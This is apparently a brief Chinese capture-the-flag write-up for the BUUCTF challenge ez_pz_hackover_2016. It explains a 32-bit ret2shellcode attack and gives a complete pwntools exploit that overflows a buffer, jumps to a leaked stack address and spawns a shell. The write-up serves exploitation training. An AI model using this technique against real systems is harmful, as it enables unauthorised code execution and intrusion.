# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ez_pz_hackover_2016)

这是一道`ret2shellcode(32)`，进行比较绕过，然后计算出shellcode的偏移地址。

checksec一下，



# exp

```python
from pwn import *
context(os="linux",arch="i386",log_level="debug")
p=remote('node5.buuoj.cn',27809)
#p=process('./ez_pz_hackover_2016')
p.recvuntil("0x")
stack=int(p.recv(8),16)
print(hex(stack))
p.recvuntil(b"> ")
# gdb.attach(p)
shellcode=asm(shellcraft.sh())
pause()
payload=flat(b'crashme\x00',b'a'*(0x16-0x4),p32(stack-0x1c),shellcode)
p.sendline(payload)
p.interactive()
```

